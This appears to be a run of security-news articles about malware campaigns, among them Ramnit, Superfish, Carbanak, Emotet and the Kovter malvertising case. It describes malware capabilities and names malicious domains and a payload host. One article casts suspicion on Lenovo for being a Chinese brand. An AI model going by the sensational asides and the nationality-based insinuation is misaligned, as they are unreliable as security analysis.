eavesdropping on online conversations which held via Skype, MSN and Yahoo messenger, and records and transfers keystrokes, clipboard data, and monitors which websites an infected user has visited. Babar was used against Iranian nuclear research institutes and universities, and European financial institutions. It was previously mentioned in a slideshow leaked by NSA whistleblower Edward Snowden, where it was linked to French Government by the Canadian intelligence agency. Casper, on other hand, is the mature version of the Babar and is literally a ghost spy program. Once infected, Casper surveillance malware gather all the \"intelligence information\" about the target computer and sends them back to the control center without ever revealing its presence. If a victim was found interesting and worthy of further hacking, Casper surveillance malware enabled the hackers to deploy additional malware, such as Babar, through a built-in platform for plugins." }

It is not clear whether anyone of them is involved in the hack or it is quite possible that attacker is trying to expose the real identity of the hacking crew. The Superfish Malware raised serious security concerns about the company’s move for breaking fundamental web security protocols, because anyone with the password that unlocks that single password-protected certificate authority would be able to completely bypass the computer's web encryption. After that Facebook security team also discovered at least 12 more apps using the same \"SSL hijacking\" technology that gave the Superfish malware capability to evade rogue certificate.

In a recent update, we reported that FBI is offering $3 Million in Reward for the arrest of GameOver Zeus botnet mastermind, and meanwhile British cyber-police has taken down widely-spread RAMNIT botnet. The National Crime Agency (NCA) in a joint operation with Europol's European Cybercrime Centre (EC3) and law enforcement agencies from Germany, Italy, the Netherlands, and the United Kingdom has taken down the Ramnit \"botnet\", which has infected over 3.2 million computers worldwide, including 33,000 in the UK. Alike GameOver Zeus, RAMNIT is also a 'botnet' - a network of zombie computers which operate under criminal control for malicious purposes like spreading viruses, sending out spam containing malicious links, and carrying out distributed denial of service attacks (DDoS) in order to bring down target websites. RAMNIT believes to spread malware via trustworthy links sent through phishing emails or social networking sites, and mainly target people running Windows operating systems in order to steal money from victims bank accounts. Moreover, public FTP servers have also been found distributing the malware. Once installed, the infected computer comes under the control of the botnet operators. The module inadvertently downloads a virus onto the victim’s computer which could be used by operators to access personal or banking information, steal passwords and disable anti-virus protection. RAMNIT SHUT-DOWN IN AN OPERATION In a statement on Tuesday, Europol revealed that the successful take-down of Ramnit botnet involved the help of Microsoft, Symantec and AnubisNetworks. The groups shut down the botnet's command and control infrastructure and redirected traffic from a total of 300 domain addresses used by Ramnit criminal operators. \"This successful operation shows the importance of international law enforcement working together with private industry in the fight against the global threat of cybercrime,\" said Wil van Gemart, Europol's deputy director of operations. \"We will continue our efforts in taking down botnets and disrupting the core infrastructures used by criminals to conduct a variety of cybercrimes.\" NASTY FEATURES OF RAMNIT BOTNET Symantec says that Ramnit has been around for over four years, first originating as a computer worm. According to the anti-virus firm, Ramnit is a \"fully-featured cybercrime tool, featuring six standard modules that provide attackers with multiple ways to compromise a victim.\" The features are: SPY MODULE - This is one of the most powerful Ramnit features, as it monitors the victim’s web browsing and detects when they visit online banking sites. It can also inject itself into the victim’s browser and manipulate the bank’s website in such a way that it appears legitimate and easily grab victim’s credit card details. COOKIE GRABBER - This steals session cookies from web browsers and send them back to the Ramnit operators, who can then use the cookies to authenticate themselves on websites and impersonate the victim. This could allow an attacker to hijack online banking sessions. DRIVE SCANNER - This scans the computer’s hard drive and steals files from it. The scanner is configured in such a way that it searches for specific folders which contain sensitive information such as victims’ passwords. ANONYMOUS FTP SERVER - By connecting to this server, the malware lets attackers remotely access the infected computers and browse the file system. The server can be used to upload, download, or delete files and execute commands. VIRTUAL NETWORK COMPUTING (VNC) MODULE - This feature provides the attackers with another means to gain remote access to the compromised computers. FTP GRABBER - This feature allows the attackers to gather login credentials for a large number of FTP clients. WHY BOTNET RE-EMERGE AFTER TAKEDOWNS ? According to the authorities, Ramnit botnet has been taken down, but is it guaranteed that the botnet will not re-emerged again? We have seen the took down of GameOver Zeus botnet by FBI and Europol as well, but what happened at last? Just after a month, GameOver Zeus botnet again came into operation with more nasty features. So, What went wrong? Why Botnet take downs are ineffective? One reason could be that the organisations grab and take-down only a small fraction of command-and-control domains that build up the Botnet critical infrastructure, but leaves a majority of fraction active. This takes some months for a botnet operator to recover. As more and more botnet networks are taken down by Law Enforcement, cyber criminals are increasingly using secondary communication methods, such as peer-to-peer or domain generation algorithms (DGA). One of the main reasons that the Botnet re-emerged is because the author of the malware didn’t get arrested. No matter how many domains are taken down or how many sinkholes researchers create, if the attackers are not arrested, nobody can stop them from building new Botnet from zero. On this we really appreciate the FBI step to reward $3 Million for the information leading to the direct arrest or conviction of Evgeniy Mikhailovich Bogachev, the alleged author of GameOver Zeus botnet that was used by cybercriminals to steal more than $100 Million from online bank accounts." }

Recently, the police department of the Midlothian Village in Illinois has paid a ransom of over $600 in Bitcoins to an unknown hacker after being hit by a popular ransomware attack. The popular Ransomware, dubbed Cryptoware, disabled a police computer in Midlothian — located south of Chicago — by making it inaccessible through its file-encryption capabilities and forced them to pay a ransom in order to restore access to the important police records. The Chicago Tribune reported that the department first encountered Cryptoware in January, when someone in the department opened a spear-phishing email that pointed to the malicious software. Once opened, the email carrying the Cryptoware ransomware immediately encrypts the files on the computer and, in typical ransomware style, displays a message demanding money in exchange for a decrypt code that could free the device from Cryptoware. Midlothian Police Chief Harold Kaufman confirmed the police department had been hacked, but declined further comment. Local IT professionals assured that the hacker didn’t get access to files in the police department's database, rather the Cryptoware program only made certain documents inaccessible. \"It didn't encrypt everything in the police department. It was just that computer and specific files, not the entire system,\" Calvin Harden Jr., an IT vendor who works with the village and the police on overcoming this threat, told the Tribune. Cybersecurity experts recommend business users routinely back up their data, but, according to Harden, the police officials were forced to make the payment because going after the hacker might have been more trouble than it was worth. \"Because the backups were also infected, the option was to pay the hacker and get the files unencrypted, which is what we decided to do,\" Harden told the newspaper. This isn’t the first time when hackers have targeted a government agency. Back in November, 2013, the cyber criminals had managed to encrypt the database of Massachusetts' Swansea Police Department by CryptoLocker ransomware and forced them to pay $750 to restore their files. Midlothian follows the city of Detroit and a sheriff's office in Tennessee as Cryptoware victims within the last year. Forcing victims to pay via Bitcoin provides the hackers an easy method to collect money and moving on to future victims with little-to-no digital footprint However, law enforcement succeeded in decreasing various ransomware attacks, but with the discovery of 2.0 versions, the ransomware even made it way to infect the mobile devices. Previously known and popular Ransomware are as follow: CryptoLocker Cryptowall PrisonLocker and now Cryptoware is really a threat to online users. The best defense against Ransomware is creating awareness within the organization and at home, as well as maintaining backups that are rotated regularly. Ensure that your systems are running the latest version of Antivirus software with up to date malware definitions." }

The password with the right software could allow a hacker to insert malware or potentially spy on a vulnerable Lenovo user sharing the same Wi-Fi network. United States Computer Emergency Readiness Team (US-CERT) also warned Friday that Superfish malware could be exploited to \"allow a remote attacker to read all encrypted web browser traffic (HTTPS), successfully impersonate (spoof) any website, or perform other attacks on the affected system.\" AUTOMATICALLY REMOVE 'SUPERFISH' COMPLETELYLenovo joined hands with Microsoft and McAfee, and created a custom uninstall tool to clean your computer of the Superfish malware program and its CA certificates, and in a responsibly transparent move, also posted the source code and license of the removal tool for scrutiny.\"We apologize for causing these concerns among our users - we are learning from this experience and will use it to improve what we do and how we do it in the future,\" the company said.The company has released an \"automated tool\", which the PC maker says will \"ensure complete removal of Superfish and Certificates for all major browsers.\" If in case users don’t prefer to use the automated tool, the company has also provided a step-by-step process for how to remove SuperFish manually. CHECK FOR 'SUPERFISH' MALWARE NOWSuperFish is an adware that tampers with your computer’s encryption certificates, which seemingly leaves your otherwise \"encrypted\" communications insecure whenever you are on a shared WiFi connection (like at a coffee shop). It can silently intercept and decrypt HTTPS connections, tamper with pages and inject advertisements. Superfish is present on Lenovo laptops sold between September 2014 and January 2015, although the company says no Thinkpads were shipped with the Superfish malware. Still, you can check your Lenovo computers for this nasty software with the help of a test created by researcher Filippo Valsorda." }

So, next time be very sure while you turn off your Android smartphones. The new Android malware threat, dubbed PowerOffHijack, has been spotted and analyzed by the researchers at the security firm AVG. PowerOffHijack because the nasty malware has a very unique feature - it hijacks the shutdown process of user’s mobile phone. MALWARE WORKS AFTER SWITCHING OFF MOBILES When users presses the power button on their device, a fake dialog box is shown. The malware mimics the shutdown animation and the device appears to be off, but actually remains on, giving the malicious program freedom to move around on the device and steal data. \"After pressing the power button, you will see the real shutdown animation, and the phone appears off. Although the screen is black, it is still on,\" AVG’s mobile malware research team explained in a blog post. \"While the phone is in this state, the malware can make outgoing calls, take pictures and perform many other tasks without notifying the user.\" HOW DOES POWEROFFHIJACK MALWARE WORKS ? Once installed, the malware asks for root-level permissions and tampers with the 'system_server' file of the operating system to affect the shutdown process. The malware particularly hijacks the mWindowManagerFuncs interface, so that it can display a fake shutdown dialog box and animation every time the victim presses the power button. The nasty malware is apparently being propagated via third-party online app stores, but the researchers haven't mentioned the names of the the innocent-looking apps, also they haven’t explained how the malware gains the root access of the device. The code shown by AVG appears to contact Chinese services. USERS AND ANDROID VERSIONS INFECTED According to the company, PowerOffHijack malware infects devices running Android versions below 5.0 (Lollipop) and requires root access to perform the tasks. So far, PowerOffHijack malware has already infected more than 10,000 devices, mostly in China where the malware was first introduced and offered through the local, official app stores. PowerOffHijack malware has ability to silently send lots of premium-rate text messages, make calls to expensive overseas numbers, take photos and perform many other tasks even if the phone is supposedly switched off. EASY STEPS TO GET RID OF POWEROFFHIJACK In order to get rid of PowerOffHijack malware, users are advised to take some simple steps: To restart infected device manually just take out the battery. Remove malicious, untrusted and useless apps from your Android device. Do not install apps from 3rd Party app stores. Make sure you have a good anti-virus installed and updated on your mobile devices. AVG antivirus product can detect PowerOffHijack malware." }

The software, dubbed ‘Superfish Malware’, analyzes users’ Internet habits and injects third-party advertising into websites on browsers such as Google Chrome and Internet Explorer based on that activities without the user’s permission. Security researchers recently discovered Superfish Malware presents onto new consumer-grade Lenovo computers sold before January of 2015. When taken out of the box for the first time, the adware gets activated and because it comes pre-installed, Lenovo customers might end up using it inadvertently. SUPERFISH CERTIFICATE PASSWORD CRACKED The Superfish Malware raised serious security concerns about the company’s move for breaking fundamental web security protocols, carrying out \"Man in the Middle\" (MitM) attacks - impersonating the security certificates of encrypted websites in order to monitor users’ behavior even on protected sites. This would trouble Lenovo users because MitM attack can open a door for hackers to potentially compromise the sensitive information of any customer affected by Superfish - like passwords or banking details - because users’ data isn't actually being protected. Anyone with the password that unlocks that single password-protected certificate authority would be able to completely bypass the computer's web encryption. According to a post by Errata Security's Robert David Graham, he cracked and published the password which was stored in the Superfish software's active memory and was trivial to extract. So, one could imagine the loss, if the same would be done by any hacker or cyber crook. SUPERFISH MALWARE TEMPORARILY REMOVED After the news fired up over the Internet and multiple users complained of popups and other unwanted behavior, the computer giant removed the Superfish Malware. \"We have temporarily removed Superfish from our consumer systems until such time as Superfish is able to provide a software build that addresses these issues. As for units already in market, we have requested that Superfish auto-update a fix that addresses these issues,\" a Lenovo community administrator, Mark Hopkins, wrote in late January. Hopkins also defended the company from criticism over installing Superfish in the first place — but it didn't address the false HTTPS certificate problem. He also says that Lenovo users can refuse the terms and conditions when setting up their laptop in order to disable the software. \"To be clear, Superfish technology is purely based on contextual/image and not behavioral,\" Hopkins’ statement reads. \"It does not profile nor monitor user behavior. It does not record user information. It does not know who the user is.\" SELF-SIGNED HTTPS CERTS RAISED MAJOR SECURITY CONCERNS While other users on online forums are reporting that Superfish Malware actually installs its own self-signed certificate authority which effectively allows the company to snoop on secure connections. And if true, Superfish Malware could be far more dangerous than we had thought. \"A blatant man-in-the-middle attack malware breaking privacy laws. I have requested return of the laptop and refund as I find it unbelievable that ... Lenovo would facilitate such applications pre bundled with new laptops,\" the user wrote on the Lenovo forums. Facebook engineering director Mike Shaver also warned about the invasive adware via his personal Twitter account, saying that he found SuperFish certificates posted by different users who had shared the same RSA key. \"Lenovo installs a MITM cert and proxy called SuperFish, on new laptops, so it can inject ads? Someone tell me that's not the world I'm in,\" Shaver tweeted. LENOVO - IT’S JUST TO ENHANCE USERS’ EXPERIENCE The company this morning issued a weird statement addressing the controversy on the Lenovo computers. According to the computer giant, the Superfish software was \"to help customers potentially discover interesting products while shopping.\" \"The relationship with Superfish is not financially significant,\" the statement reads. \"Our goal was to enhance the experience for users. We recognize that the software did not meet that goal and have acted quickly and decisively.\" What was my reaction on the fresh statement issued by the company? Oh! Come on Lenovo, we know the reality. May be you are one of the world’s largest PC brands, but after all you are also a Chinese PC brand. HOW TO REMOVE LENOVO SUPERFISH In order to remove Lenovo Superfish Malware from your system, run the Microsoft Management Console (mmc.exe), and do the following: Go to File and Click Add/Remove. Choose Certificates, click Add. Choose Computer Account, click Next Choose Local Computer, click Finish Click OK Look under Trusted Root Certification Authorities -> Certificates Find the one issued to Superfish and delete it. LENOVO’S BAD HISTORY REGARDING BACKDOOR This isn't first time, in past the computer giant was caught installing malware backdoors in its products and was also banned by different countries for same reasons. In the mid of 2013, the spy agencies - the ‘five eyes’ alliance of the US, Britain, Canada, Australia, and New Zealand - banned Lenovo for allegedly installing backdoor into Lenovo-brand circuit boards, along with other vulnerabilities discovered into the firmware." }

A hacker group has infiltrated a number of banks and financial institutions in several countries, stealing hundreds of Millions of dollars in possibly the biggest bank heist the world has ever seen. According to a report published by the New York Times on Saturday, hackers have stolen as much as $1 Billion from more than 100 banks and other financial companies in almost 30 nations, making it \"the most sophisticated attack the world has seen to date.\" In late 2013, banks in Russia, Japan, Europe, the United States and other countries fell victim to a massive, sophisticated malware hack that allowed the hackers to spy on bank officials in order to mimic their behavior, according to an upcoming report by Kaspersky Labs received by the NY Times. CARBANAK BANKING MALWARE IN THE WILD In order to infect bank staffs, the hacker group sent malicious emails to hundreds of employees at different banks. Once open, the email downloads a malware program called Carbanak, that allegedly allowed perpetrators to transfer money from the banks to fake accounts or ATMs monitored by criminals. The exact figure of the stolen amount is unclear, though, according to the cybersecurity firm, the total theft could be more than $300 Million. Because, the hackers only swiped $10 million at a time and some banks were targeted more than once. \"This is likely the most sophisticated attack the world has seen to date in terms of the tactics and methods that cybercriminals have used to remain covert,\" Chris Doggett, manager of Kaspersky's North American office in Boston, told the Times. However, the cyber security firm does not name the banks and financial institutions involved in the massive theft operation in its report. But, the interesting part is that no banks have come forward to reveal that they have been hacked in this largest theft. HISTORY OF CYBER HEIST This is not first time when hackers have made banks and financial institutions as their target. In past, they had carried out a number of bank crimes. The list is given below: In March, 2012 - A Russian hacker was sentenced to two years in US prison for his involvement in a global bank Million Dollar Fraud scheme that used hundreds of phony bank accounts to steal over $3 million from dozens of U.S.accounts. He was responsible for the Zeus banking malware that was used to carry out the fraud. In October, 2012 - FBI arrested 14 people who used cash advance kiosks at casinos located in Southern California and Nevada and robbed over $1 million from Citibank. In May, 2013 - A gang of cyber-criminals operating in 26 countries stole $45 Million by hacking into the database of prepaid debit cards, making it the biggest bank robbery in the history. In July, 2013 - A hacker group allegedly broke into the computer networks of more than a dozen of major American and International corporations and stole 160 million credit card numbers over the course of 7 years, making it the largest data theft case ever prosecuted in the U.S. In October, 2013 - The Dutch police arrested four people who used TorRat Malware to target two out of three major Banks in the Netherlands and stole over Millions of Dollars from Banking Accounts." }

Many security professionals rely largely on manual methods for collecting, analyzing, and consuming information about latest cyber security threats such as malware and botnets. Whereas, Mark Zuckerberg’s ThreatExchange is a unique social media platform where multiple organizations can sign up and share information about new threats to cyber security, new types of hacks, phishing attacks and malicious activities they may have experienced. COLLABORATE AND TAKE ACTION Facebook is currently using a threat analysis framework called \"ThreatData\" to discover and tackle scams and cybercrimes, but with the growth in the magnitude of cyber attacks, Facebook believes that better communication between companies could help stamp them out. \"We quickly learned that sharing with one another was key to beating the botnet because parts of it were hosted on our respective services and none of us had the complete picture,\" Mark Hammell said, manager of the Facebook threat infrastructure. Several high-profile companies have joined ThreatExchange dedicated platform for sharing information about hacking attacks or cyber security threats with one another, including Bitly, Dropbox, Pinterest, Tumblr, Twitter and Yahoo. ThreatExchange data includes typically freely available information such as domain names sending out spam, or examples of malware. However, Facebook has also built privacy tools into the system, so that security professionals can decide what they want to share and with whom, without worrying about disclosing sensitive information. \"This approach makes it easier for an organization that may want to share data that needs to be handled with extra sensitivity,\" Facebook said. As an example, If Facebook reels under a botnet attack, it can let others know what to do in order to protect themselves. Armed with real-time and detailed information on emerging cyber security threats, ThreatExchange platform would allow everyone to update their defenses to avoid becoming a victim of any kind of online threats. Currently, ThreatExchange is only available in beta and interested participants can fill out a form on Facebook’s site in order to be a part of this initiative." }

Last month, the messaging giant WhatsApp, with 700 million users worldwide, finally launched its web client to the public. The feature is called \"WhatsApp Web,\" which gives its users the ability to read and send messages directly from their web browsers. FAKE WHATSAPP WEB SPREADING BANKING TROJANS However, malicious hackers have taken the advantage of the latest WhatsApp Web and have started fooling users all over the world with fake downloads masquerading as a desktop variant of the WhatsApp mobile application. Security researchers at Kaspersky Labs have spotted a seemingly genuine WhatsApp Web for Windows in spam campaign available for fake download that actually spreads financial malware Trojans to the systems worldwide. \"Fake downloads appeared in several languages and countries, and now there is a real product out there the fraudsters have returned to their old attacks, dressed them up in new clothes and sent them on the prowl for new victims,\" wrote Fabio Assolini from Kaspersky Lab. APP MASQUERADE EXACTLY AS LEGITIMATE Researchers found a number of malicious domains registered by the cybercriminals to host their malware. Some of them were already in use and others were waiting for command from the criminals. One such domain, whatsappcdesktop.com.br, was found to be distributing Brazilian banking Trojan. Assolini also explained that the firm has discovered some cases where unsuspecting users have been fooled to install a suspicious Google Chrome extension shown as a simple messaging app, but in real has nothing to do with WhatsApp: HACKERS GOAL - VICTIMS’ MOBILE NUMBERS The researchers also spotted many other promising but unofficial desktop versions of the fake Whatsapp Web offered to Arabic and Spanish language speakers as the legitimate version of the popular messaging application. The main objective is to get the mobile phone number of the victims. In some cases, the attackers requested victims to enter and submit their mobile number in an attempt to download the fake Whatsapp Web client. Once submitted, the attacker would be able to run spam campaigns or make the victims unknowingly subscribe to premium-rate services. BE CAREFUL AND FOLLOW RECOMMENDATION A single unwanted message could lead you to harmful pages hosting malware that can infect your phones and carry out malicious things even without your knowledge. It is almost impossible to get rid of unwanted messages, however it is safer to access WhatsApp on the web from the official website located at https://web.whatsapp.com. So, users are recommended to refuse imitations and suspicious applications. Late last month, a 17-year-old security researcher discovered a couple of security holes in the WhatsApp Web client that may expose profile pictures of WhatsApp Web users. However, that was no surprise as these types of small security and implementation flaws could be expected at this time, but one thing is guaranteed that the app will not lead you to any Malware." }

The spyware campaign, dubbed \"Operation Pawn Storm\" by security experts, was first detected on Windows computers late last year, but has now made its way to iOS devices, a report by security researchers at TrendLabs noted. The researchers linked the campaign to the Russian government. XAGENT SPYWARE APP One of the two spywares used in the campaign is actually an application, the firm dubbed the app XAgent, that attempts to install and run on iOS devices. \"The XAgent app is fully functional malware,\" the researchers noted. \"The exact methods of installing these malware is unknown; however, we do know that the iOS device doesn't have to be jailbroken ... We have seen one instance wherein a lure involving XAgent simply says 'Tap Here to Install the Application'.\" The fake website then distributes the spyware via Apple's ad-hoc provisioning feature intended for enterprises and developers who wish to distribute their apps to a small group of individuals and allows users to bypass the App Store. XAGENT COLLECTS ALMOST EVERYTHING Once installed, XAgent will collect text messages, contact lists, pictures, geolocation data, information from a list of installed apps on an iOS device, and the WiFi status of the device. The information is then sent back to a server operated by the hackers. XAgent is also capable of switching on the phone’s microphone and recording everything it hears. The XAgent malware application runs on both iOS 7 and iOS 8 devices, whether they’ve been jailbroken or not. The malicious app is most dangerous on iOS 7 since it hides its icon to evade detection, but it is unable to hide itself or automatically restart itself on iOS 8 devices. MADCAP GAME APP Another malware agent of Operation Pawn Storm is a malware that disguised as a game called \"MadCap\". It focused on recording audio and only works on jailbroken devices. MadCap functionality is similar to XAgent, but differs in that it can only be installed on jailbroken devices. Security researchers said that the malware applications appeared to be carefully maintained and consistently updated by the hackers. The attackers' have not been identified yet, although the command and control server used in the attacks was in operation at the time of research." }

Don’t click any porn links on Facebook. Foremost reason is that you have thousands of good porn sites out there, but there's an extra good reason right now. Rogue pornography links on the world’s most popular social network have reportedly infected over 110,000 Facebook users with a malware Trojan in just two days and it is still on the rise, a security researcher warned Friday. The Facebook malware disguised as a Flash Player update and spreads itself by posting links to a pornographic video from the Facebook accounts of previously infected users. The malware generally tags as many as 20 friends of the infected user.\"In the new technique, which we call it 'Magnet,' the malware gets more visibility to potential victims by tagging the friends of the victim in the malicious post,\" said Mohammad Faghani, a senior consultant at PricewaterhouseCoopers, in a mailing list post to the Full Disclosure infosec hangout. \"A tag may be seen by friends of the victim's friends as well, which leads to a larger number of potential victims. This will speed up the malware propagation.\"The malicious post will provide you a link to a porn video in one of your friend's posts. Once clicked, the malicious link will land you a website that will prompt you to quickly download and run a Flash update in order to play the video message purporting to be pornography. Unfortunately, doing so will download a Trojan horse directly onto your computer system, allowing a malicious hacker to hijack your Keyboard and Mouse. By having control of victim’s keyboard and mouse, one can capture very useful information – like webmail and bank account passwords. Once installed on a Windows PC, the malware collects the victim's data and tries to communicate with the server behind the filmver.com and pornokan.com domains for more instructions. Faghani notes that the malicious file drops the chromium.exe, wget.exe, arsiv.exe and verclsid.exe executable files. In general, Chromium.exe is a generic dropper that probably downloads more malware to install, such as the keylogger, once it's running. This new technique also enables the malware to keep a low profile, while also displaying itself publicly on your profile, and this is only the reason how the malware infected so many Facebook users just in two days. The other embarrassing part of this is when your family and friends see that you have just liked and shared porn links on your wall.In a statement, Facebook said, \"We use a number of automated systems to identify potentially harmful links and stop them from spreading. In this case, we're aware of these malware varieties, which are typically hosted as browser extensions and distributed using links on social media sites.\"In order to stop the wave of infections, Facebook is \"blocking links to these scams, offering cleanup options, and pursuing additional measures to ensure that people continue to have a safe experience on Facebook.\" To protect yourself from such type of malware infections, just avoid clicking rogue porn links on the social media sites, and when it’s Facebook, Don't do it ! Just Don’t !" }

Drones were once used for land surveillance, Delivering Pizza's, then equipped with bombs that changed the way nations conduct war and last year, these hovering drones were also used to hack Smartphones. Recently, a security researcher has found a backdoor in the Parrot AR Drones manufactured by a French-based company, that could allow a malicious hacker to remotely hijacked the radio controlled flying quadcopter helicopter. The Parrot AR Drone, revealed at the International CES 2010 in Las Vegas, is a quadricopter helicopter which you can control with your smartphone or tablet. It features two built-in cameras, is easy to fly, and can be controlled without too much danger of it flipping over or smashing into things. FIRST EVER MALWARE FOR DRONES Security researcher, Rahul Sasi claimed to have developed the first ever backdoor malware for AR drone ARM Linux system, dubbed Maldrone [MALware DRONE]. Maldrone can be used to remotely hijack drones, as shown in a video demonstration below published by the hacker. \"In this we would show infecting a drone with Maldrone and expecting a reverse tcp connection from drone. Once connection is established we can interact with the software as well as drivers/sensors of drone directly. There is an existing AR drone piloting program. Our backdoors kills the autopilot and takes control. The Backdoor is persistent across resets,\" video explained. According to the researcher, Maldrone can interact with the drone’s device drivers and sensors silently and allow the hacker to control the drone remotely. As a result, Maldrone could be used to conduct remote surveillance. Rahul said the Maldrone could also be used to attack other drone makers as well. However, the backdoor could be exploited within a wireless range. DRONE CRASHES ON WHITE HOUSE GROUNDS Drones has highlighted the growing security threat posed by small Unmanned Aerial Vehicles (UAVs). Just recently, a 2-foot quadcopter drone crashed onto the White House grounds in the early hours of Monday morning, when the president and first lady Michelle Obama were in India. A government employee told the Secret Service that he lost control of the quadcopter drone before it crashed on the grounds of the White House. However, no one at the White House were in danger." }

Sad, but it’s True! Joseph Edwards, a 17-year-old schoolboy from Windsor, Berkshire, hanged himself after receiving a bogus email appeared to be from police claiming that he'd been spotted browsing illegal websites and that a fine of 100 pound needed to be paid in order to stop the police from pursuing him. The scam email pushed the well-known Police Ransomware onto the boy’s laptop and also downloaded malware that locked up his system once it was opened. Edwards was an A-level student with Autism, a developmental disability, that likely made him more susceptible to believing the Internet scam mail, supposedly sent from from Cheshire police, was genuine, a coroner heard on Thursday. Edwards was so upset and depressed by the accusation and the extortionate demand that he hanged himself hours after falling victim to the crucial threat. He was found hanged at his family home in Windsor by his mother Jacqueline Edwards, who told the coroner that he probably didn't understand the implications of his actions.\"He didn't seem to have any worries known to me. I don't think he really understood,\" Jacqueline Edwards told the coroner. \"Joseph was subjected to a scam on the internet, a threatening, fake police link that was asking for money,\" his mother said in a statement. \"He would have taken it literally because of his autism and he didn't want to upset Georgia [his sister] or me.\"As far as we all know, a Police ransomware of this type does not encrypt files and usually asks a victim to pay a small fine that last around $200 or €200. It’s normally much easier to remove the threat from infected systems by using dedicated tools specially designed to remove such infections. According to Detective Sergeant Peter Wall, it will be almost impossible to trace the fraudsters behind the 'crude' email, but believe it may have originated outside the UK. This is not first time when Ransomware has become deadly reason to take someone’s life. Over a year ago, a Romanian family faced same Police Ransomware threat and the Romanian victim hanged himself and his four-year-old son, scarring that his young son would pay for his mistake and his life would be spend in the moment of delusion. Ransomware is one of the most blatant and obvious criminal's money making schemes out there, from which Cryptolocker threat had touched the peak, and cyber criminals have developed many Cryptolocker versions (prisonlocker, linkup, icepole, cryptobit) by which you have to safeguard your system." }

Compromising a website and then hosting malware on it has become an old tactic for hackers, and now they are trying their hands in compromising vast majority of users in a single stroke. Researchers have discovered that hackers are now using Pastebin to spread malicious backdoor code. According to a blog post published yesterday by a senior malware researcher at Sucuri, Denis Sinegubko, the hackers are leveraging the weakness in older versions of the RevSlider, a popular and a premium WordPress plugin. The plugin comes packaged and bundled into the websites’ themes in such a way that many website owners don't even know they have it. In order to exploit the vulnerability, first hackers look for a RevSlider plugin in the target website and once discovered, they use a second vulnerability in Revslider and attempt to upload a malicious backdoor to the website. \"Technically, the criminals used Pastebin for what it was built for – to share code snippets,\" Sinegubko wrote in a blog post. \"The only catch is that the code is malicious, and it is used in illegal activity (hacking) directly off of the Pastebin website.\" Security researchers came across a segment of code that injects the content of a Base64-encoded $temp variable into a WordPress core wp-links-opml.php file. Researchers noticed some code is being downloaded from the legitimate Pastebin.com website and is dependent on using a parameter, wp_nonce_once, that disguises the fact that it calls upon an actual Pastebin file. The wp_nonce_once parameter, which is commonly used to protect against unexpected or duplicate requests, also makes the malicious code difficult to block, and at the same time \"adds flexibility to the backdoor,\" the researcher claims. This means that the malicious backdoor can be tricked to download and execute any code snippet hosted on Pastebin — even those that don't exist at the time of injection — you just need to pass a request through that wp-links-opml.php file. So far, it’s unclear exactly how widespread this malicious backdoor is, but the impact could be much dangerous when it comes to Pastebin which has 1.5 million active user accounts as of last year. Founded in 2002, Pastebin was initially developed as an open online forum where computer developers could share programming code. But the site’s gradual appeal to hackers of all ranks made it increasingly difficult to monitor the site for bad behavior. Many hacker groups share data stolen from famous companies via the service and some pastes are also known to be used in malware attacks, which may contain encrypted addresses and even base64-encoded malicious binary code. Last month security researchers at Sucuri discovered a new type of malware threat, dubbed SoakSoak, that was modifying files in WordPress websites that used an older version of “Slider Revolution,” aka RevSlider, a slideshow plugin. At the time, the search engine giant Google blacklisted over 11,000 websites it spotted spreading the malware." }

At the end of last year, Cyphort Labs, security firm specialized in detecting malware threats, came across some malicious advertisements that were being served on the United States and Canadian versions of the popular news website The Huffington Post. The malicious advertisements eventually redirected visitors of the news website to other websites hosting exploit kits, in order to attack victims’ computers and install malware. Researchers discovered that the malvertising campaign originates with ads being served by AOL’s Advertising.com network. Once clicked, users are redirected through a series of redirects, some of which used HTTPS encrypted connections, to a page that served either the Neutrino Exploit Kit or the Sweet Orange Exploit Kit. \"Interestingly attackers used a mix of HTTP and HTTPS redirects to hide the servers involved in this attack,\" the Cyphort analysis of the attack states. \"The HTTPS redirector is hosted on a Google App Engine page. This makes analysis based on traffic PCAPs more difficult, because HTTPS traffic is encrypted.\" The exploit kit served both Adobe Flash and VB script exploits – a common target for cybercriminals due to the wide range of vulnerabilities found in it – and then downloaded the Kovter trojan, which is actually a Ransomware that locks the infected computer's screen from access by the user. \"The purpose of this attack is to install a malicious binary – a new variant of a Trojan, from the Kovter family. (SHA1: eec439cb201d12d7befe5482e8a36eeb52206d6f),\" the researchers say. \"The malware was downloaded from indus.qgettingrinchwithebooks.babia-gora.pl:8080 , it was a un-encrypted binary. After execution it connects to a16-kite.pw for CNC. It executes through injecting its payload to a spawned svchost.exe process.\" The websites hosting the exploit kit were \".pl\" domains, the country code top-level domain for Poland. Researchers also noticed that a variety of other websites, including weatherbug.com, mandatory.com and houstonpress.com, were also distributing the malware via malicious advertisements, with the common link being the \"adtech.de\" and \"advertising.com\" advertising networks — both ad platforms owned by AOL. AOL.com was notified of the issue on Saturday. A spokesman confirmed Cyphort’s findings and said the company took the necessary steps to fix the problem. AOL.com said it has stopped malicious software being served by its advertising platforms after being alerted by a security company. \"AOL is committed to bringing new levels of transparency to the advertising process, ensuring ads uphold quality standards and create positive consumer experiences,\" the spokesman wrote." }

The malware, identified as Emotet, was first spotted last June by security vendors at Trend Micro. The most standout features of Emotet is its network sniffing ability, which enables it to capture data sent over secured HTTPS connections by hooking into eight network APIs, according to Trend Micro. Microsoft has been monitoring a new variant of Emotet banking malware, Trojan:Win32/Emotet.C, since November last year. This new variant was sent out as part of a spam email campaign that peaked in November. Emotet has been distributed through spam messages, which either contain a link to a website hosting the malware or a PDF document icon that is actually the malware. HeungSoo Kang of Microsoft’s Malware Protection Center identified a sample of the spam email message that was written in German, including a link to a compromised website. This indicates that the campaign primarily targeted mostly German-language speakers and banking websites. The spam messages are written in such a way that it easily gain the attention of potential victims. It could masquerade as some sort of fraudulent claim, such as a phone bill, an invoice from a bank or a message from PayPal. Once it infect a system, Emotet downloads a configuration file which contains a list of banks and services it is designed to steal credentials from, and also downloads a file that intercepts and logs network traffic. Network sniffing is especially a disturbing part of this malware because in that a cyber criminal becomes omniscient to all information being exchanged over the network. In short, users can go about with their online banking without even realizing that their data is being stolen. Emotet will pull credentials from a variety of email programs, including versions of Microsoft’s Outlook, Mozilla’s Thunderbird and instant messaging programs such as Yahoo Messenger and Windows Live Messenger. All the stolen information is sent back to Emotet’s \"command and control (C&C) server where it is used by other components to send spam emails to spread the threat,\" Kang wrote. \"We detect the Emotet spamming component as Spammer:Win32/Cetsiol.A.\" Spam emails containing Emotet malware are difficult for email servers to filter because the messages actually originate from legitimate email accounts. Therefore, typical anti-spam techniques, such as callback verification, won't be applicable on it. 